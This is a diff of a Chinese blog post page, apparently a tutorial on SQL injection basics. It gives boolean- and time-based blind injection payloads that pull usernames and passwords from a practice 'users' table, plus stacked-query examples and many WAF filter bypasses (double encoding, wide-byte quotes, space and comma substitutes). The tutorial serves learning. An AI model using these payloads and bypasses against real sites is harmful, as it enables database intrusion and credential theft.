+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; and left((select column_name from information_schema.columns where table_name=&#x27;</span>users<span class="hljs-string">&#x27; limit 12,1),8)=&#x27;</span>username<span class="hljs-string">&#x27; --+</span><br></code></pre></td></tr></table></figure>
 <p>–爆字段</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and length((select password from users order by id limit 0,1))=8 --+(长度)</span></span><br><span class="line"><span class="string">?id=1&#x27;</span> <span class="keyword">and</span> <span class="keyword">left</span>((<span class="keyword">select</span> password <span class="keyword">from</span> users <span class="keyword">order</span> <span class="keyword">by</span> id limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">4</span>)<span class="operator">=</span><span class="string">&#x27;dumb&#x27;</span> <span class="comment">--+</span></span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and left((select username from users order by id limit 0,1),4)=&#x27;</span>dumb<span class="string">&#x27; --+</span></span><br></pre></td></tr></table></figure>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and length((select password from users order by id limit 1,1))=10 --+(长度)</span></span><br><span class="line"><span class="string">?id=1&#x27;</span> <span class="keyword">and</span> <span class="keyword">left</span>((<span class="keyword">select</span> username <span class="keyword">from</span> users <span class="keyword">order</span> <span class="keyword">by</span> id limit <span class="number">1</span>,<span class="number">1</span>),<span class="number">8</span>)<span class="operator">=</span><span class="string">&#x27;angelina  &#x27;</span> <span class="comment">--+</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; and length((select password from users order by id limit 0,1))=8 --+(长度)</span><br><span class="hljs-string">?id=1&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-keyword">left</span>((<span class="hljs-keyword">select</span> password <span class="hljs-keyword">from</span> users <span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> id limit <span class="hljs-number">0</span>,<span class="hljs-number">1</span>),<span class="hljs-number">4</span>)<span class="hljs-operator">=</span><span class="hljs-string">&#x27;dumb&#x27;</span> <span class="hljs-comment">--+</span><br>?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; and left((select username from users order by id limit 0,1),4)=&#x27;</span>dumb<span class="hljs-string">&#x27; --+</span><br></code></pre></td></tr></table></figure>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; and length((select password from users order by id limit 1,1))=10 --+(长度)</span><br><span class="hljs-string">?id=1&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-keyword">left</span>((<span class="hljs-keyword">select</span> username <span class="hljs-keyword">from</span> users <span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> id limit <span class="hljs-number">1</span>,<span class="hljs-number">1</span>),<span class="hljs-number">8</span>)<span class="hljs-operator">=</span><span class="hljs-string">&#x27;angelina  &#x27;</span> <span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure>
 <h3 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h3><ul>
 <li><p>适用：<br><code>无查询结果、报错信息的回显，页面正常显示的情况</code></p>
 </li>
@@ -197,7 +416,7 @@
 <li><p><code>if(expr1,expr2,expr3)</code>含义：<code>exp1</code>为<strong>TRUE</strong> 则 if()返回值为<code>expr2</code>,否则返回值为<code>expr3</code>. ——即 (1真返回2，1假返回3).</p>
 </li>
 <li><p>eg判断数据库库名长度语句为：</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if (length ( database() ) <span class="operator">&gt;</span><span class="number">1</span> , sleep(<span class="number">5</span>) , <span class="number">1</span>)</span><br></pre></td></tr></table></figure>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">if (length ( database() ) <span class="hljs-operator">&gt;</span><span class="hljs-number">1</span> , sleep(<span class="hljs-number">5</span>) , <span class="hljs-number">1</span>)<br></code></pre></td></tr></table></figure>
 <h3 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h3></li>
 <li><p>堆叠注入的使用条件十分有限，可能受到API、数据库引擎或者权限的限制。</p>
 </li>
@@ -208,7 +427,7 @@
 <li><p>堆叠查询可以执行多条语句，多语句之间以分号隔开。堆叠注入就是利用此特点，在第二条sql语句中构造要注入的语句。</p>
 </li>
 <li><p> eg：</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;;select if(substr(user(),1,1)=&#x27;</span>r<span class="string">&#x27;,sleep(3),1) --+</span></span><br></pre></td></tr></table></figure></li>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-string">&#x27;;select if(substr(user(),1,1)=&#x27;</span>r<span class="hljs-string">&#x27;,sleep(3),1) --+</span><br></code></pre></td></tr></table></figure></li>
 <li><p>这里的第二条语句(select if(substr(user(),1,1)=’r’,sleep(3),1) –+)即为时间盲注的语句</p>
 </li>
 <li><p>使用PDO执行SQL语句时，可以执行多条语句，不过这样通常不能直接得到注入结果，因为PDO只会返回第一条SQL语句执行的结果，所以在第二条语句中可以用update更新数据或者使用时间盲注获取数据</p>
@@ -267,7 +486,7 @@
 </li>
 <li><p>服务器会字段对URL进行一次编码，所以要把关键词编码两次。<br>注：此处URL编码要选择全编码</p>
 </li>
-<li><p>原理：<br><code>服务器会进行一次编码，但后续的进程如服务器、程序函数等等解码并不统一，攻击者就是利用此处的不统一将关键字在过滤出进行编码绕过，再在随后的解码步骤解码还原。</code>（图片源自网易Web安全工程师课程，侵删）：<img src="https://img-blog.csdnimg.cn/20201124161940246.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTUwODMyMw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"></p>
+<li><p>原理：<br><code>服务器会进行一次编码，但后续的进程如服务器、程序函数等等解码并不统一，攻击者就是利用此处的不统一将关键字在过滤出进行编码绕过，再在随后的解码步骤解码还原。</code>（图片源自网易Web安全工程师课程，侵删）：<img src="https://img-blog.csdnimg.cn/20201124161940246.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTUwODMyMw==,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" alt="在这里插入图片描述"></p>
 </li>
 </ul>
 <h2 id="内联注释绕过注入"><a href="#内联注释绕过注入" class="headerlink" title="内联注释绕过注入"></a>内联注释绕过注入</h2><ul>
@@ -277,57 +496,378 @@
 <h2 id="特殊符号绕过"><a href="#特殊符号绕过" class="headerlink" title="特殊符号绕过"></a>特殊符号绕过</h2><p>除了以上这些，有些waf也会过滤一些特殊符号：空格、=、&lt;、&gt;等等<br>这里的bypass方法实际就是寻找等效的命令，或者用特殊的姿势实现绕过</p>
 <h3 id="空格过滤绕过注入"><a href="#空格过滤绕过注入" class="headerlink" title="空格过滤绕过注入"></a>空格过滤绕过注入</h3><ul>
 <li>适用于空格被置换为空的情况，除了sql注入，很多地方都有这样的WAF</li>
-<li>bypass：<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">()</span><br><span class="line"><span class="comment">/**/</span></span><br><span class="line">回车(url编码为：<span class="operator">%</span><span class="number">0</span>a)</span><br><span class="line">`(反引号)</span><br><span class="line">tap</span><br><span class="line">双空格</span><br></pre></td></tr></table></figure>
+<li>bypass：<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs sql">()<br><span class="hljs-comment">/**/</span><br>回车(url编码为：<span class="hljs-operator">%</span><span class="hljs-number">0</span>a)<br>`(反引号)<br>tap<br>双空格<br></code></pre></td></tr></table></figure>
 <h3 id="or-and-xor-not过滤绕过"><a href="#or-and-xor-not过滤绕过" class="headerlink" title="or and xor not过滤绕过"></a>or and xor not过滤绕过</h3></li>
-<li>bypass:<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">and</span> <span class="operator">=</span> <span class="operator">&amp;&amp;</span></span><br><span class="line"><span class="keyword">or</span> <span class="operator">=</span> <span class="operator">||</span></span><br><span class="line">xor <span class="operator">=</span> <span class="operator">|</span> # 异或</span><br><span class="line"><span class="keyword">not</span> <span class="operator">=</span> <span class="operator">!</span></span><br></pre></td></tr></table></figure>
+<li>bypass:<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">and</span> <span class="hljs-operator">=</span> <span class="hljs-operator">&amp;&amp;</span><br><span class="hljs-keyword">or</span> <span class="hljs-operator">=</span> <span class="hljs-operator">||</span><br>xor <span class="hljs-operator">=</span> <span class="hljs-operator">|</span> # 异或<br><span class="hljs-keyword">not</span> <span class="hljs-operator">=</span> <span class="hljs-operator">!</span><br></code></pre></td></tr></table></figure>
 <h3 id="号过滤绕过"><a href="#号过滤绕过" class="headerlink" title="=号过滤绕过"></a>=号过滤绕过</h3></li>
-<li>bypass: <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">不加通配符`<span class="operator">%</span>`的`<span class="keyword">like</span>`和`relike`</span><br><span class="line">`<span class="operator">!</span><span class="operator">&lt;&gt;</span>`</span><br><span class="line">利用关键字`regexp`进行正则表达匹配</span><br><span class="line">利用比较函数`strcmp(str1,str2)`</span><br></pre></td></tr></table></figure></li>
+<li>bypass: <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sql">不加通配符`<span class="hljs-operator">%</span>`的`<span class="hljs-keyword">like</span>`和`relike`<br>`<span class="hljs-operator">!</span><span class="hljs-operator">&lt;&gt;</span>`<br>利用关键字`regexp`进行正则表达匹配<br>利用比较函数`strcmp(str1,str2)`<br></code></pre></td></tr></table></figure></li>
 <li>不加通配符<code>%</code>的<code>like</code>和<code>relike</code> (效果等同于=)</li>
 </ul>
 <p>不加通配符<code>%</code>的<code>like</code>：</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> table1 <span class="keyword">where</span> id <span class="keyword">like</span> <span class="number">1</span>;</span><br><span class="line"><span class="operator">+</span><span class="comment">----+----------+----------+</span></span><br><span class="line"><span class="operator">|</span> id <span class="operator">|</span> name     <span class="operator">|</span> password <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+----------+----------+</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">1</span> <span class="operator">|</span> test1    <span class="operator">|</span> pass1    <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+----------+----------+</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs sql">mysql<span class="hljs-operator">&gt;</span> <span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> table1 <span class="hljs-keyword">where</span> id <span class="hljs-keyword">like</span> <span class="hljs-number">1</span>;<br><span class="hljs-operator">+</span><span class="hljs-comment">----+----------+----------+</span><br><span class="hljs-operator">|</span> id <span class="hljs-operator">|</span> name     <span class="hljs-operator">|</span> password <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">----+----------+----------+</span><br><span class="hljs-operator">|</span>  <span class="hljs-number">1</span> <span class="hljs-operator">|</span> test1    <span class="hljs-operator">|</span> pass1    <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">----+----------+----------+</span><br></code></pre></td></tr></table></figure>
 <p>添加通配符<code>%</code>的<code>like</code>：</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> table1 <span class="keyword">where</span> name <span class="keyword">like</span> &quot;test%&quot;;</span><br><span class="line"><span class="operator">+</span><span class="comment">----+----------+----------+</span></span><br><span class="line"><span class="operator">|</span> id <span class="operator">|</span> name     <span class="operator">|</span> password <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+----------+----------+</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">1</span> <span class="operator">|</span> test1    <span class="operator">|</span> pass1    <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">3</span> <span class="operator">|</span> test3    <span class="operator">|</span> pass3    <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+----------+----------+</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs sql">mysql<span class="hljs-operator">&gt;</span> <span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> table1 <span class="hljs-keyword">where</span> name <span class="hljs-keyword">like</span> &quot;test%&quot;;<br><span class="hljs-operator">+</span><span class="hljs-comment">----+----------+----------+</span><br><span class="hljs-operator">|</span> id <span class="hljs-operator">|</span> name     <span class="hljs-operator">|</span> password <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">----+----------+----------+</span><br><span class="hljs-operator">|</span>  <span class="hljs-number">1</span> <span class="hljs-operator">|</span> test1    <span class="hljs-operator">|</span> pass1    <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span>  <span class="hljs-number">3</span> <span class="hljs-operator">|</span> test3    <span class="hljs-operator">|</span> pass3    <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">----+----------+----------+</span><br></code></pre></td></tr></table></figure>
 <ul>
 <li><code>!&lt;&gt;</code><br><code>&lt;&gt;</code>相当于<code>!=</code>，所有<code>!&lt;&gt;</code>就相当于<code>=</code></li>
 </ul>
-<h3 id="lt-gt-过滤绕过"><a href="#lt-gt-过滤绕过" class="headerlink" title="&lt;&gt;过滤绕过"></a>&lt;&gt;过滤绕过</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">`greatest(n1, n2,…)`:返回n中的最大值</span><br><span class="line">`least(n1,n2,…)`:返回n中的最小值</span><br><span class="line">`strcmp(str1,str2)`:若所有的字符串均相同，则返回STRCMP()，若根据当前分类次序，第一个参数小于第二个，则返回 <span class="number">-1</span>，其它情况返回 <span class="number">1</span></span><br><span class="line">关键字`<span class="keyword">in</span>`</span><br></pre></td></tr></table></figure>
+<h3 id="lt-gt-过滤绕过"><a href="#lt-gt-过滤绕过" class="headerlink" title="&lt;&gt;过滤绕过"></a>&lt;&gt;过滤绕过</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sql">`greatest(n1, n2,…)`:返回n中的最大值<br>`least(n1,n2,…)`:返回n中的最小值<br>`strcmp(str1,str2)`:若所有的字符串均相同，则返回STRCMP()，若根据当前分类次序，第一个参数小于第二个，则返回 <span class="hljs-number">-1</span>，其它情况返回 <span class="hljs-number">1</span><br>关键字`<span class="hljs-keyword">in</span>`<br></code></pre></td></tr></table></figure>
 
-<h3 id="引号-单、双-过滤绕韩国"><a href="#引号-单、双-过滤绕韩国" class="headerlink" title="引号(单、双)过滤绕韩国"></a>引号(单、双)过滤绕韩国</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">引号连同引号内内容一起转为十六进制</span><br><span class="line">宽字节绕过：</span><br><span class="line">    # 过滤单引号时</span><br><span class="line">    <span class="operator">%</span>bf<span class="operator">%</span><span class="number">27</span> <span class="operator">%</span>df<span class="operator">%</span><span class="number">27</span> <span class="operator">%</span>aa<span class="operator">%</span><span class="number">27</span></span><br><span class="line"><span class="operator">%</span>df\’ <span class="operator">=</span> <span class="operator">%</span>df<span class="operator">%</span><span class="number">5</span>c<span class="operator">%</span><span class="number">27</span><span class="operator">=</span>縗’</span><br></pre></td></tr></table></figure>
+<h3 id="引号-单、双-过滤绕韩国"><a href="#引号-单、双-过滤绕韩国" class="headerlink" title="引号(单、双)过滤绕韩国"></a>引号(单、双)过滤绕韩国</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs sql">引号连同引号内内容一起转为十六进制<br>宽字节绕过：<br>    # 过滤单引号时<br>    <span class="hljs-operator">%</span>bf<span class="hljs-operator">%</span><span class="hljs-number">27</span> <span class="hljs-operator">%</span>df<span class="hljs-operator">%</span><span class="hljs-number">27</span> <span class="hljs-operator">%</span>aa<span class="hljs-operator">%</span><span class="hljs-number">27</span><br><span class="hljs-operator">%</span>df\’ <span class="hljs-operator">=</span> <span class="hljs-operator">%</span>df<span class="hljs-operator">%</span><span class="hljs-number">5</span>c<span class="hljs-operator">%</span><span class="hljs-number">27</span><span class="hljs-operator">=</span>縗’<br></code></pre></td></tr></table></figure>
 <h3 id="，过滤绕过"><a href="#，过滤绕过" class="headerlink" title="，过滤绕过"></a>，过滤绕过</h3><ul>
 <li>，被过滤会影响许多函数的使用,特别是盲注需要用到很多函数都需要逗号</li>
-<li>bypass：<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pos <span class="keyword">for</span> len</span><br><span class="line"><span class="keyword">join</span></span><br><span class="line">关键字 <span class="keyword">like</span>(提取子串的函数中的逗号 <span class="keyword">select</span> ascii(substr(<span class="keyword">user</span>(),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">=</span><span class="number">114</span>; <span class="operator">=</span><span class="operator">&gt;</span> <span class="keyword">select</span> <span class="keyword">user</span>() <span class="keyword">like</span> &quot;r%&quot;)</span><br><span class="line">关键字 <span class="keyword">offset</span>(limit <span class="number">1</span>,<span class="number">2</span> <span class="operator">=</span><span class="operator">&gt;</span> limit <span class="number">1</span> <span class="keyword">offset</span> <span class="number">2</span>)</span><br></pre></td></tr></table></figure>
-eg:<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pos <span class="keyword">for</span> len 代替 ，</span><br><span class="line">原本的substr函数：           <span class="keyword">select</span> substr(&quot;string&quot;,<span class="number">1</span>,<span class="number">3</span>); </span><br><span class="line">用<span class="keyword">from</span> pos <span class="keyword">for</span> len代替逗号： <span class="keyword">select</span> substr(&quot;string&quot; <span class="keyword">from</span> <span class="number">1</span> <span class="keyword">for</span> <span class="number">3</span>);</span><br></pre></td></tr></table></figure>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">原语句：<span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span></span><br><span class="line"><span class="keyword">join</span> 代替 ，：<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users  <span class="keyword">union</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="number">1</span>)a <span class="keyword">join</span> (<span class="keyword">select</span> <span class="number">2</span>)b <span class="keyword">join</span>(<span class="keyword">select</span> <span class="number">3</span>)c;</span><br></pre></td></tr></table></figure>
+<li>bypass：<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">from</span> pos <span class="hljs-keyword">for</span> len<br><span class="hljs-keyword">join</span><br>关键字 <span class="hljs-keyword">like</span>(提取子串的函数中的逗号 <span class="hljs-keyword">select</span> ascii(substr(<span class="hljs-keyword">user</span>(),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))<span class="hljs-operator">=</span><span class="hljs-number">114</span>; <span class="hljs-operator">=</span><span class="hljs-operator">&gt;</span> <span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>() <span class="hljs-keyword">like</span> &quot;r%&quot;)<br>关键字 <span class="hljs-keyword">offset</span>(limit <span class="hljs-number">1</span>,<span class="hljs-number">2</span> <span class="hljs-operator">=</span><span class="hljs-operator">&gt;</span> limit <span class="hljs-number">1</span> <span class="hljs-keyword">offset</span> <span class="hljs-number">2</span>)<br></code></pre></td></tr></table></figure>
+eg:<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">from</span> pos <span class="hljs-keyword">for</span> len 代替 ，<br>原本的substr函数：           <span class="hljs-keyword">select</span> substr(&quot;string&quot;,<span class="hljs-number">1</span>,<span class="hljs-number">3</span>); <br>用<span class="hljs-keyword">from</span> pos <span class="hljs-keyword">for</span> len代替逗号： <span class="hljs-keyword">select</span> substr(&quot;string&quot; <span class="hljs-keyword">from</span> <span class="hljs-number">1</span> <span class="hljs-keyword">for</span> <span class="hljs-number">3</span>);<br></code></pre></td></tr></table></figure>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql">原语句：<span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span><br><span class="hljs-keyword">join</span> 代替 ，：<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> users  <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span> <span class="hljs-number">1</span>)a <span class="hljs-keyword">join</span> (<span class="hljs-keyword">select</span> <span class="hljs-number">2</span>)b <span class="hljs-keyword">join</span>(<span class="hljs-keyword">select</span> <span class="hljs-number">3</span>)c;<br></code></pre></td></tr></table></figure>
 
 </li>
 </ul>
 <h3 id="函数绕过"><a href="#函数绕过" class="headerlink" title="函数绕过"></a>函数绕过</h3><p>实质是找等价函数</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sleep() <span class="operator">=</span><span class="operator">&gt;</span> benchmark()</span><br><span class="line">ascii() <span class="operator">=</span><span class="operator">&gt;</span> ord()、hex()、bin() #不一定用ascii码，也可转为其他进制；但ord()于ascii()对中文处理不同</span><br><span class="line">group_concat() <span class="operator">=</span><span class="operator">&gt;</span> concat_ws()</span><br><span class="line"><span class="keyword">user</span>() <span class="operator">=</span><span class="operator">&gt;</span> @<span class="variable">@user</span>  #全局变量</span><br><span class="line">datadir <span class="operator">=</span><span class="operator">&gt;</span> @<span class="variable">@datadir</span> #全局变量</span><br></pre></td></tr></table></figure></div><div id="reward-container"><span class="hty-icon-button button-glow" id="reward-button" title="打赏" onclick="var qr = document.getElementById(&quot;qr&quot;); qr.style.display = (qr.style.display === &quot;none&quot;) ? &quot;block&quot; : &quot;none&quot;;"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-hand-coin-line"></use></svg></span><div id="reward-comment">I'm so cute. Please give me money.</div><div id="qr" style="display:none;"><div style="display:inline-block"><a href="/images/zfbpay.jpg"><img loading="lazy" src="/images/zfbpay.jpg" alt="支付宝" title="支付宝"></a><div><span style="color:#00A3EE"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-alipay-line"></use></svg></span></div></div><div style="display:inline-block"><a href="/images/qqpay.png"><img loading="lazy" src="/images/qqpay.png" alt="QQ 支付" title="QQ 支付"></a><div><span style="color:#12B7F5"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-qq-line"></use></svg></span></div></div><div style="display:inline-block"><a href="/images/wcpay.png"><img loading="lazy" src="/images/wcpay.png" alt="微信支付" title="微信支付"></a><div><span style="color:#2DC100"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-wechat-pay-line"></use></svg></span></div></div></div></div><ul class="post-copyright"><li class="post-copyright-author"><strong>本文作者：</strong>Na0h_1e3</li><li class="post-copyright-link"><strong>本文链接：</strong><a href="http://na0hblog.top/2020/12/30/sql%E6%B3%A8%E5%85%A5%E7%9A%84%E4%B8%80%E4%BA%9B%E5%9F%BA%E6%93%8D/" title="sql注入的一些基操">http://na0hblog.top/2020/12/30/sql%E6%B3%A8%E5%85%A5%E7%9A%84%E4%B8%80%E4%BA%9B%E5%9F%BA%E6%93%8D/</a></li><li class="post-copyright-license"><strong>版权声明：</strong>本博客所有文章除特别声明外，均默认采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank" rel="noopener" title="CC BY-NC-SA 4.0 "><svg class="icon"><use xlink:href="#icon-creative-commons-line"></use></svg><svg class="icon"><use xlink:href="#icon-creative-commons-by-line"></use></svg><svg class="icon"><use xlink:href="#icon-creative-commons-nc-line"></use></svg><svg class="icon"><use xlink:href="#icon-creative-commons-sa-line"></use></svg></a> 许可协议。</li></ul></section></article><div class="post-nav"><div class="post-nav-item"><a class="post-nav-prev" href="/2021/01/03/xss-lab%E9%80%9A%E5%85%B3%E5%B0%8F%E8%AE%B0/" rel="prev" title="xss-lab通关小记"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-arrow-left-s-line"></use></svg><span class="post-nav-text">xss-lab通关小记</span></a></div><div class="post-nav-item"></div></div></div><div id="comment"><div class="comment-tooltip text-center"><span>在下方留下你的评论吧~</span><br><span>评论前先登陆噢</span><br></div><div id="lv-container" data-id="city" data-uid="MTAyMC81MjMyMy8yODgwMQ=="><script>(function(d, s) {
-  var j, e = d.getElementsByTagName(s)[0];
-  if (typeof LivereTower === 'function') { return; }
-  j = d.createElement(s);
-  j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
-  j.async = true;
-  e.parentNode.insertBefore(j, e);
-})(document, 'script');</script></div></div></main><footer class="sidebar-translate" id="footer"><div class="copyright"><span>&copy; 2020 – 2021 </span><span class="with-love" id="animate"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-cloud-line"></use></svg></span><span class="author"> Na0h_1e3</span></div><div class="powered"><span>由 <a href="https://hexo.io" target="_blank" rel="noopener">Hexo</a> 驱动 v5.3.0</span><span class="footer-separator">|</span><span>主题 - <a rel="noopener" href="https://github.com/YunYouJun/hexo-theme-yun" target="_blank"><span>Yun</span></a> v1.3.0</span></div><div class="live_time"><span>自Na0h将神光棒放入此处已经</span><span id="display_live_time"></span><span class="moe-text">٩(͡๏̯͡๏)۶</span><script>function blog_live_time() {
-  window.setTimeout(blog_live_time, 1000);
-  const start = new Date('2020-12-31T00:00:00');
-  const now = new Date();
-  const timeDiff = (now.getTime() - start.getTime());
-  const msPerMinute = 60 * 1000;
-  const msPerHour = 60 * msPerMinute;
-  const msPerDay = 24 * msPerHour;
-  const passDay = Math.floor(timeDiff / msPerDay);
